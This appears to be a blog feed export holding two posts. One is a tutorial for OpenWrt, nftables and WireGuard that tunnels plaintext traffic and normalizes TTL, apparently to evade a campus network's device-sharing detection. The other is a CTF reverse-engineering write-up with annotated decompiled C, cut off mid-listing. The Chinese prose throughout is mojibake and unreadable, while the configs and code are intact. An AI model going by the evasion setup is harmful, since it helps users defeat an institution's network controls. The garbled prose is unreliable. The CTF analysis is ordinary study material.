    <content><![CDATA[<h2 id="åŸºæœ¬åŸç†">åŸºæœ¬åŸç†</h2>
<p>åˆ©ç”¨åŠ å¯†éš§é“ä¼ è¾“å¯èƒ½æš´éœ²è®¾å¤‡ç‰¹å¾çš„éåŠ å¯†æµé‡
(<code>NTP</code>/<code>HTTP</code>/<code>DNS</code>ç­‰) ,
ç›´è¿<code>443</code>ç«¯å£è®©<code>HTTPS</code>æµé‡ç›´æ¥æµå‘å…¬ç½‘å‡å°‘æœåŠ¡å™¨å¸¦å®½æ¶ˆè€—,
å¹¶é™ä½ç½‘é¡µæµè§ˆå»¶æ—¶.
å¦å¤–å°†<code>wan</code>å£å‡ºå»çš„æµé‡å…¨éƒ¨ç»Ÿä¸€<code>TTL</code>,
ä»è€Œå®ç°<code>wan</code>å£ä¸åŒ…å«ä»»ä½•éåŠ å¯†æµé‡ä¸”ä¸åŒ…å«<code>TTL</code>ç‰¹å¾.</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆä¸ä¼ªè£…<code>UA</code>å’Œ<code>IPID</code>?</p>
<p><code>HTTP</code>æµé‡èµ°åŠ å¯†éš§é“å‡ºå»äº†æ— éœ€ä¼ªè£…;
å®æµ‹<code>IPID</code>ä¸åœ¨æ£€æµ‹èŒƒå›´å†…, ä¹Ÿä¸éœ€è¦.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232005840.png" alt="image-20241023200522750" style="zoom:80%;" /></p>
<h2 id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</h2>
<ul>
<li><p>ä¸€å°å¯ä»¥åˆ·<code>OpenWrt</code>çš„è·¯ç”±å™¨, æœ€å¥½æ˜¯å®˜æ–¹æ”¯æŒçš„, æ¯”å¦‚
<code>Redmi-AC2100</code>/<code>Redmi-AX6S</code>.</p></li>
<li><p>ä¸€å°è½åœ°<code>VPS</code>, åœ°åŸŸæœ€å¥½æ˜¯æ¹–åŒ—,
ç”¨äºå’Œè·¯ç”±å™¨å»º<code>WireGuard</code>åŠ å¯†éš§é“,
è½¬å‘é™¤<code>HTTPS</code>ä»¥å¤–çš„æµé‡.
å› ä¸ºæµé‡å¤§éƒ¨åˆ†éƒ½æ¥è‡ªäº<code>HTTPS</code>, æ‰€ä»¥è¿™ä¸ªæœºå™¨å¸¦å®½è¦æ±‚ä¸é«˜,
ä¸ä¸‹<code>BT</code>è¿™ç§åŸºæœ¬æ²¡å•¥é—®é¢˜,
å¦‚æœä½ æ°å¥½è´¢åŠ›é›„åšå¯ä»¥è€ƒè™‘å¤§å¸¦å®½æœåŠ¡å™¨.</p></li>
</ul>
<blockquote>
<p>æˆ‘ç”¨çš„<a href="https://yiandrive.com/">äº¿å®‰äº‘</a>, å‡ å—é’±ä¸€ä¸ªæœˆ,
è·‘æ»¡ç™¾å…†æ²¡é—®é¢˜, NATæœºé…ä¸€ä¸‹ç«¯å£æ˜ å°„åˆä¸æ˜¯ä¸èƒ½ç”¨(</p>
</blockquote>
<p>æœ¬æ•™ç¨‹åŸºäºæœ€æ–°ç‰ˆ<code>OpenWrt-23.05.5</code>ç¼–å†™,
ä½¿ç”¨<code>Nfatbles</code>å®Œæˆé˜²ç«å¢™é…ç½®,
æ—§ç‰ˆä½¿ç”¨<code>iptabes</code>ä¸èƒ½ç›´æ¥å¥—ç”¨.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232113782.png" alt="image-20241023211354698" style="zoom:45%;" /></p>
<h2 id="é…ç½®æµç¨‹">é…ç½®æµç¨‹</h2>
<h3 id="é…ç½®è½¬å‘æœåŠ¡å™¨">é…ç½®è½¬å‘æœåŠ¡å™¨</h3>
<p>ä»¥<code>Ubuntu</code>ä¸ºä¾‹, <code>SSH</code>è¿æ¥ä¸Šå»ä¹‹å,
ç¼–è¾‘<code>/etc/sysctl.conf</code>, æ‰“å¼€è·¯ç”±è½¬å‘å¹¶é‡å¯.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
<p>å®‰è£…<code>Wireguard</code>, ç½‘ç»œé—®é¢˜å…ˆæ¢æº.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt install wireguard</span><br></pre></td></tr></table></figure>
<p>é…ç½®<code>WireGuard</code>, å‡†å¤‡<code>wg0.conf</code>.</p>
<p>ç§é’¥ç”¨<code>wg genkey</code>ç”Ÿæˆ, ç”¨<code>wg pubkey</code>è¯»å‡ºå…¬é’¥,
æ€»å…±éœ€è¦ä¸¤å¯¹, è·¯ç”±å™¨ä¸€å¯¹, <code>VPS</code>ä¸€å¯¹.</p>
<blockquote>
<p>æ–‡ä»¶åå†³å®šäº†<code>WireGuard</code>ç½‘ç»œæ¥å£çš„åå­—, ä¸è¦æ”¹,
å¦å¤–<code>ens18</code>éœ€è¦æ”¹ä¸º<code>VPS</code>çš„å‡ºå£ç½‘å¡å.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Interface</span><br><span class="line">PrivateKey = [VPSç«¯çš„ç§é’¥]</span><br><span class="line">Address = 10.0.0.1/24</span><br><span class="line">PostUp   = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens18 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ens18 -j MASQUERADE</span><br><span class="line">ListenPort = 25053</span><br><span class="line">MTU = 1280</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = [è·¯ç”±å™¨ç«¯çš„å…¬é’¥]</span><br><span class="line">AllowedIPs = 10.0.0.0/24</span><br></pre></td></tr></table></figure>
<p>å‡†å¤‡å¥½ä¹‹åæ‰§è¡Œ<code>wg-quick up ./wg0.conf</code>å¯åŠ¨ç½‘ç»œæ¥å£,
æ­£å¸¸çŠ¶æ€ç±»ä¼¼ä¸‹å›¾.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231936017.png" alt="image-20241023193625966" style="zoom: 50%;" /></p>
<blockquote>
<p>æŸäº›æœºå™¨å¯èƒ½éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–, æˆ‘è¿™å°ç¼ºå¤±<code>openresolv</code>,
ä½¿ç”¨<code>apt install openresolv</code>å®‰è£…å³å¯.</p>
<p>ç„¶åå†<code>wg-quick down ./wg0.conf &amp;&amp; wg-quick up ./wg0.conf</code>é‡å¯æ¥å£.</p>
</blockquote>
<p>é€šè¿‡<code>wg show</code>å¯ä»¥æŸ¥çœ‹æ¥å£çŠ¶æ€(å›¾ä¸­å› ä¸ºæ¥å£å·²ç»è¿æ¥,
ç•¥æœ‰ä¸åŒ), å¦‚æœæ²¡æœ‰æ˜¾ç¤ºä»»ä½•å†…å®¹è¯´æ˜æ²¡ç”Ÿæ•ˆ.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231929479.png" alt="image-20241023192926429" style="zoom: 80%;" /></p>
<h3 id="é…ç½®è·¯ç”±å™¨ç¯å¢ƒ">é…ç½®è·¯ç”±å™¨ç¯å¢ƒ</h3>
<p>å»ºè®®ä½¿ç”¨å®˜æ–¹ç‰ˆ<code>OpenWrt</code>, æ–¹ä¾¿è¿›è¡Œå›ºä»¶å®šåˆ¶,
åœ¨é‡ç½®è·¯ç”±å™¨åå¯ä»¥ä¸ç”¨ä»å¤´å®‰è£…è½¯ä»¶åŒ…,
<code>OpenWrt</code>æä¾›äº†å¿«æ·çš„å›ºä»¶å®šåˆ¶ç½‘é¡µ.</p>
<blockquote>
<p><code>ImmortalWrt</code>ä¹Ÿå¯ä»¥, è¿™é‡Œä»¥<code>OpenWrt</code>ä¸ºä¾‹.</p>
<p><a href="https://firmware-selector.openwrt.org/">ä¸‹è½½é€‚ç”¨äºæ‚¨è®¾å¤‡çš„
OpenWrt å›ºä»¶</a></p>
</blockquote>
<p>éœ€è¦æ·»åŠ çš„è½¯ä»¶åŒ…,
åˆ†åˆ«æ˜¯<code>luci</code>æ±‰åŒ–åŒ…,<code>iproute2</code>å’Œ<code>wireguard</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luci-i18n-base-zh-cn</span><br><span class="line">luci-i18n-firewall-zh-cn</span><br><span class="line">luci-i18n-opkg-zh-cn</span><br><span class="line">ip-full</span><br><span class="line">luci-proto-wireguard</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹é¦–æ¬¡è¿è¡Œè„šæœ¬, å¦‚å›¾, åœ¨æœ«å°¾æ’å…¥, å®ç°è‡ªåŠ¨æ¢æº.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/downloads.openwrt.org/mirrors.ustc.edu.cn\/openwrt/g&#x27; /etc/opkg/distfeeds.conf</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä¿®æ”¹ä¸€ä¸‹<code>lan_ip_address="192.168.31.1"</code>,
é¿å…é»˜è®¤<code>192.168.1.1</code>çš„<code>lan</code>åœ°å€å’Œå…¶ä»–è®¾å¤‡å†²çª.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410231952313.png" alt="image-20241023195206214" style="zoom: 40%;" /></p>
<p>ç„¶åæŠŠå›ºä»¶åˆ·å…¥è®¾å¤‡å³å¯, é‡ç½®è·¯ç”±å™¨ä¹Ÿä¸ç”¨é‡æ–°å®‰è£…äº†.
ä¸é‡‡ç”¨å®šåˆ¶å›ºä»¶æ–¹å¼ä¹Ÿå¯ä»¥è‡ªå·±å»<code>OpenWrt</code>åå°è‡ªå·±è£…, å°±æ˜¯éº»çƒ¦,
æ•ˆæœä¸€æ ·.</p>
<h3 id="é…ç½®nftables">é…ç½®nftables</h3>
<p><code>SSH</code>è¿æ¥åˆ°è·¯ç”±å™¨,
åœ¨<code>/etc/nftables.d/</code>ä¸‹æ–°å»º<code>user_mangle.nft</code>æ–‡ä»¶,
åŸæœ‰æ–‡ä»¶å¯ä»¥ä¸åŠ¨, ä¹Ÿå¯ä»¥æŠŠä»¥ä¸‹å†…å®¹ç²˜è´´åˆ°åŸæœ‰æ–‡ä»¶ä¹‹å, æ•ˆæœä¸€æ ·.</p>
<p>ç¬¬ä¸€ä¸ªé“¾å°†ä»<code>lan</code>å£æ¥çš„ç›®çš„ç«¯å£ä¸º<code>443</code>çš„æµé‡æ‰“ä¸Š<code>0x233</code>æ ‡è®°,
ç¬¬äºŒä¸ªé“¾å°†æ‰€æœ‰ä»<code>wan</code>å£æµå‡ºçš„æµé‡çš„<code>TTL</code>ç»Ÿä¸€ä¸º<code>64</code>(ç†è®ºä¸Šè¿˜éœ€è¦ä¿®æ”¹<code>IPv6</code>çš„<code>TTL</code>,
ä½†æ˜¯ä»–ä»¬æ²¡æä¾›<code>IPv6</code>ç½‘ç»œ, å°±å…ˆä¸ç®¡äº†).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chain user_mangle_mark443 &#123;</span><br><span class="line">    type filter hook prerouting priority mangle; policy accept;</span><br><span class="line">    iifname br-lan tcp dport 443 meta mark set 0x233 counter;</span><br><span class="line">    iifname br-lan udp dport 443 meta mark set 0x233 counter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain user_mangle_ttl64 &#123;</span><br><span class="line">    type filter hook postrouting priority mangle; policy accept;</span><br><span class="line">    oifname wan ip ttl set 64 counter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆåè¾“å…¥<code>service firewall restart</code>é‡å¯<code>nfatbles</code>æœåŠ¡.</p>
<blockquote>
<p>æŠ¥è¯­æ³•é”™è¯¯è¯´æ˜ç¼–è¾‘æ—¶ä½¿ç”¨äº†ä¸­æ–‡å›è½¦(CRLF)è€Œä¸æ˜¯Unixå›è½¦(LF)</p>
</blockquote>
<h3 id="wireguardè¿æ¥å‰å‡†å¤‡">WireGuardè¿æ¥å‰å‡†å¤‡</h3>
<p>å…ˆè®¤è¯è®©è·¯ç”±å™¨é€šç½‘,
å†å»<code>lan</code>å£å’Œ<code>wan</code>å£çš„é«˜çº§è®¾ç½®ä¸­æŠŠ<strong>ä½¿ç”¨é»˜è®¤ç½‘å…³</strong>å–æ¶ˆå‹¾é€‰,
é¿å…è‡ªåŠ¨æ·»åŠ è·¯ç”±å¸¦æ¥çš„å¹²æ‰°.</p>
<p>é…ç½®å®Œè·¯ç”±è¡¨åº”åªå‰©<code>lan</code>å£å’Œ<code>wan</code>å£çš„å­ç½‘è·¯ç”±,
æ²¡æœ‰<code>0.0.0.0/0</code>é»˜è®¤è·¯ç”±, æ­¤æ—¶è·¯ç”±å™¨å¤„äºæ–­ç½‘çŠ¶æ€.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232103600.png" alt="image-20241023210350526" style="zoom:50%;" /></p>
<p>é…ç½®<code>wan</code>å£<code>DNS</code>æœåŠ¡å™¨ä¸ºå…¬ç½‘<code>IP</code>æœåŠ¡å™¨,
æ¯”å¦‚<code>114</code>,
å› ä¸ºåç»­è·¯ç”±å™¨çš„<code>DNS</code>æµé‡ä¹Ÿå…¨éƒ¨èµ°åŠ å¯†éš§é“,
å†…ç½‘<code>DNS</code>æœåŠ¡å™¨ä¸å¯ç”¨.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232111372.png" alt="image-20241023211113288" style="zoom: 50%;" /></p>
<p>åœ¨é™æ€è·¯ç”±çš„<code>main</code>è¡¨ä¸­ä¸­æ·»åŠ ä¸€æ¡<code>wan</code>è·¯ç”±,
ç›®æ ‡æ˜¯<code>VPS</code>çš„<code>IP</code>,
è®©è¿æ¥<code>VPS</code>çš„æµé‡èµ°<code>wan</code>å£å‡ºå».</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232120365.png"
alt="image-20241023212054307" />
<figcaption aria-hidden="true">image-20241023212054307</figcaption>
</figure>
<p>åœ¨é˜²ç«å¢™æ–°å»ºä¸€ä¸ª<code>vpn</code>åŒºåŸŸ,
ç­‰ä¸‹è¦æŠŠ<code>WireGuard</code>çš„æ¥å£æ·»åŠ è¿›è¿™ä¸ªåŒºåŸŸ.</p>
<p><code>lan</code>åŒºåŸŸéœ€è¦å¼€å¯<code>mssé’³åˆ¶</code>,
<strong>éå¸¸é‡è¦</strong>,
ä¸å¼€å¯å¯èƒ½ä¼šå› ä¸º<code>mtu</code>é—®é¢˜ä¼šå¯¼è‡´ç”µè„‘æ— æ³•è”ç½‘.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232126886.png" alt="image-20241023212600795" style="zoom: 50%;" /></p>
<p>å…è®¸<code>lan</code>ä¾§æµé‡è½¬å‘è‡³<code>vpn</code>,
å…è®¸<code>vpn</code>ä¾§æµé‡è½¬å‘è‡³<code>wan</code>ä¾§,
å¹¶å¼€å¯<code>vpn</code>çš„<code>IP</code>åŠ¨æ€ä¼ªè£…, è®¾ç½®å®Œæ•ˆæœå¦‚å›¾.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232123866.png" alt="image-20241023212309762" style="zoom:50%;" /></p>
<p>ç¼–è¾‘é˜²ç«å¢™-é€šä¿¡è§„åˆ™, æ–°å¢ä¸€æ¡<code>Allow-Direct</code>è§„åˆ™,
å…è®¸æ‰“ä¸Š<code>0x233</code>æ ‡è®°çš„æµé‡ä»<code>lan</code>åŒºåŸŸè½¬å‘åˆ°<code>wan</code>åŒºåŸŸ.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232133291.png" alt="image-20241023213346203" style="zoom: 50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232134735.png" alt="image-20241023213350568" style="zoom: 50%;" /></p>
<h3 id="æ·»åŠ wireguardæ¥å£">æ·»åŠ WireGuardæ¥å£</h3>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232140630.png" alt="image-20241023214001566" style="zoom:50%;" /></p>
<p>å¡«å…¥è·¯ç”±å™¨ç«¯çš„å…¬ç§é’¥, è®¾ç½®<code>IP</code>. å‹¾é€‰æ— ä¸»æœºè·¯ç”±,
é‚£ä¸€æ­¥åœ¨é™æ€è·¯ç”±é‡Œé…è¿‡äº†, è‡ªåŠ¨æœ‰æ—¶å€™ä¼šå‡ºé—®é¢˜.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232140976.png" alt="image-20241023214035874" style="zoom:50%;" /></p>
<p>è®¾ç½®<code>MTU</code>ä¸º<code>1280</code>, ä¸<code>VPS</code>ä¿æŒä¸€è‡´,
å–æ¶ˆå‹¾é€‰ä½¿ç”¨é»˜è®¤ç½‘å…³.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232145462.png" alt="image-20241023214542384" style="zoom:50%;" /></p>
<p>é˜²ç«å¢™è®¾ç½®ä¸ºä¹‹å‰æ–°å»ºçš„<code>vpn</code>åŒºåŸŸ</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232147588.png" alt="image-20241023214748515" style="zoom:50%;" /></p>
<p>å¡«å…¥<code>VPS</code>çš„å…¬é’¥,
è®¾ç½®å…è®¸<code>IP</code>ä¸º<code>0.0.0.0/0</code>,
ç«¯ç‚¹<code>IP</code>ä¸º<code>VPS</code>çš„<code>IP</code>,
ç«¯å£å¡«<code>VPS</code>çš„ç›‘å¬ç«¯å£.</p>
<blockquote>
<p>å¦‚æœæ˜¯å…¬ç½‘<code>IP</code>çš„<code>VPS</code>,
é‚£ä¹ˆè¿™ä¸ªç«¯å£åº”è¯¥ä¸<code>wg0.conf</code>é‡Œçš„ç›‘å¬ç«¯å£ä¸€è‡´ä¸º<code>25053</code></p>
<p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯<code>NAT</code>ä¸»æœº, ç«¯å£å·ä¸ºè‡ªå·±æ˜ å°„çš„å¤–ç½‘ç«¯å£</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232144564.png" alt="image-20241023214439453" style="zoom:50%;" /></p>
<p>è®¾ç½®å®Œæˆåå¯ä»¥åœ¨ çŠ¶æ€-<code>Wireguard</code> é‡ŒæŸ¥çœ‹è¿æ¥æƒ…å†µ,
å¦‚æœä¸Šæ¬¡æ¡æ‰‹æ—¶é—´æ­£å¸¸çš„è¯è¯´æ˜è¿æ¥æˆåŠŸ.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232154437.png"
alt="image-20241023215420360" />
<figcaption aria-hidden="true">image-20241023215420360</figcaption>
</figure>
<h3 id="é…ç½®è·¯ç”±">é…ç½®è·¯ç”±</h3>
<p>ç¼–è¾‘<code>/etc/iproute2/rt_tables</code>,
æ·»åŠ ä¸€å¼ æ–°çš„è·¯ç”±è¡¨<code>direct</code>, åºå·ä¸º<code>50</code>,
ç”¨äºè·¯ç”±ç›´è¿æµé‡.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æ·»åŠ å®Œç±»ä¼¼è¿™æ ·</span><br><span class="line"># reserved values</span><br><span class="line">#</span><br><span class="line">128     prelocal</span><br><span class="line">255     local</span><br><span class="line">254     main</span><br><span class="line">253     default</span><br><span class="line">50      direct</span><br><span class="line">0       unspec</span><br><span class="line">#</span><br><span class="line"># local</span><br><span class="line">#</span><br><span class="line">#1      inr.ruhep</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ ä¸¤æ¡æ–°çš„è·¯ç”±</p>
<ol type="1">
<li><p><code>main</code>è¡¨çš„<code>0.0.0.0/0</code>é»˜è®¤è·¯ç”±,
ç”¨äºè½¬å‘æœ¬æœºæ‰€æœ‰æµé‡è‡³<code>vpn</code>,
é€šè¿‡<code>vpn</code>æ¥å£å‘å¾€<code>10.0.0.1</code>ç½‘å…³,
è¿™ä¸ªè·¯ç”±æ·»åŠ å®Œæˆåè·¯ç”±å™¨å’Œä¸‹é¢çš„è®¾å¤‡å°±å¯ä»¥è”ç½‘äº†,
æ­¤æ—¶æ‰€æœ‰æµé‡å‡é€šè¿‡<code>VPS</code>è½¬å‘.</p></li>
<li><p><code>direct</code>è¡¨çš„<code>0.0.0.0/0</code>é»˜è®¤è·¯ç”±,
ç”¨äºå°†ç›´è¿æµé‡é€šè¿‡<code>wan</code>å£å‘å‡º,
æ­¤æ—¶<code>direct</code>è¡¨ä¸èµ·ä½œç”¨, è¿˜éœ€è¦æ·»åŠ è·¯ç”±è§„åˆ™,
è®©å¸¦æœ‰<code>0x233</code>æ ‡è®°çš„æµé‡å»æŸ¥è¯¢è¿™å¼ è·¯ç”±è¡¨.</p></li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232200295.png"
alt="image-20241023220050209" />
<figcaption aria-hidden="true">image-20241023220050209</figcaption>
</figure>
<p>æ·»åŠ <code>IPv4</code>è·¯ç”±è§„åˆ™, è®¾ç½®ä¼˜å…ˆçº§ä¸º<code>50</code>,
è¡¨ä¸º<code>direct</code>,
åœ¨é«˜çº§è®¾ç½®é‡ŒåŒ¹é…é˜²ç«å¢™æ ‡å¿—<code>0x233</code>.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232209796.png" alt="image-20241023220907699" style="zoom: 50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232210597.png" alt="image-20241023221035510" style="zoom:50%;" /></p>
<p>æ­¤æ—¶æ‰€æœ‰é…ç½®å·²å®Œæˆ, <code>443</code>ç«¯å£ä¹Ÿç›´è¿å¤–ç½‘äº†.</p>
<p>é™„ä¸Šè·¯ç”±è¡¨/è§„åˆ™/<code>Nfatbles</code>/æ¥å£é…ç½®å‚ç…§.</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232213367.png" alt="image-20241023221308269" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232305071.png" alt="image-20241023230514961" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202410232214641.png" alt="image-20241023221448546" style="zoom:50%;" /></p>
<h2 id="åè®°">åè®°</h2>
<p>è¿™ä¸ªæ–¹æ¡ˆç†è®ºä¸Šè¿˜æœ‰å¯ä»¥æ”¹è¿›çš„åœ°æ–¹, ä¸è¿‡æˆ‘æ²¡æœ‰å†å»å°è¯•äº†,
å–œæ¬¢æŠ˜è…¾çš„å¯ä»¥è¯•è¯•.</p>
<ul>
<li>æŠŠæœåŠ¡å™¨çš„<code>IPv6</code>åœ°å€åˆ†é…åˆ°æœ¬æœºä½¿ç”¨</li>
<li>å¼€æ”¾é™¤<code>443</code>å¤–çš„å…¶å®ƒç«¯å£</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>OpenWrt</tag>
        <tag>WireGuard</tag>
        <tag>æ ¡å›­ç½‘</tag>
        <tag>nftables</tag>
      </tags>
  </entry>
  <entry>
    <title>[2019çº¢å¸½æ¯]easyRE</title>
    <url>/2022/01/28/%5BReverse%5D2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE/</url>
    <content><![CDATA[<p><code>Linux</code>å¯æ‰§è¡Œæ–‡ä»¶, ç›´æ¥æ‹–è¿›<code>IDA</code>, F5æŸ¥çœ‹ä¼ªä»£ç ,
ä½†æ˜¯æœ‰äº›å¤æ‚æŠ“ä¸ä½å…³é”®, æ‰“å¼€<code>String</code>çª—å£æ”¹ç”±å­—ç¬¦ä¸²å…¥æ‰‹.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128151231261.png"
alt="image-20220128151231261" />
<figcaption aria-hidden="true">image-20220128151231261</figcaption>
</figure>
<p>è·Ÿåˆ°å­—ç¬¦ä¸²æ‰€åœ¨ä½ç½®, äº¤å‰å¼•ç”¨ç¡®å®šç¨‹åºè¯­å¥å†F5çœ‹ä¼ªä»£ç ,
ç›´æ¥æ‰¾åˆ°å…³é”®ç‚¹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128151403433.png"
alt="image-20220128151403433" />
<figcaption aria-hidden="true">image-20220128151403433</figcaption>
</figure>
<p>åˆ†æç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4009C6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="comment">//ä¸Šé¢è¿™å‡ è¡Œä»£ç å°†v12~v14å¡«å……ä¸º&quot;Iodl&gt;Qnb(ocy\x7fy.i\x7fd`3w&#125;wek9&#123;iy=~yL@EC&quot;</span></span><br><span class="line">  <span class="comment">//è¿™ä¸€é•¿åº¦ä¸º36çš„å­—ç¬¦, ä¸åç»­v15çš„æ¯”è¾ƒåšå‡†å¤‡</span></span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  <span class="comment">//æ ¹æ®ç»éªŒ,sub_4406E0()åº”è¯¥æ˜¯æŸç§è¾“å…¥å‡½æ•°</span></span><br><span class="line">  <span class="comment">//æ„Ÿè§‰ç±»ä¼¼scanf_s(),åé¢çš„37åº”è¯¥æ˜¯é™åˆ¶é•¿åº¦</span></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  <span class="comment">//å¯è§v15çš„é•¿åº¦åº”è¯¥ä¸º36,ä½†æ˜¯v15æ•°ç»„é•¿åº¦åªæœ‰32,è¿™è¯´æ˜v16çš„å€¼è¢«è¾“å…¥å‡½æ•°è¶Šç•Œè¦†ç›–</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    <span class="comment">//ä»è¿™é‡Œå¯ä»¥çŒœå‡ºsub_424BA0()å°±æ˜¯strlen()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      <span class="comment">//å°†è¾“å…¥å­—ç¬¦ä¸²ä¸ä¸‹æ ‡å¼‚æˆ–åä¸v12å¯¹æ¯”.å·²çŸ¥v12å¾ˆå®¹æ˜“æ¨å‡ºv15çš„å€¼</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span 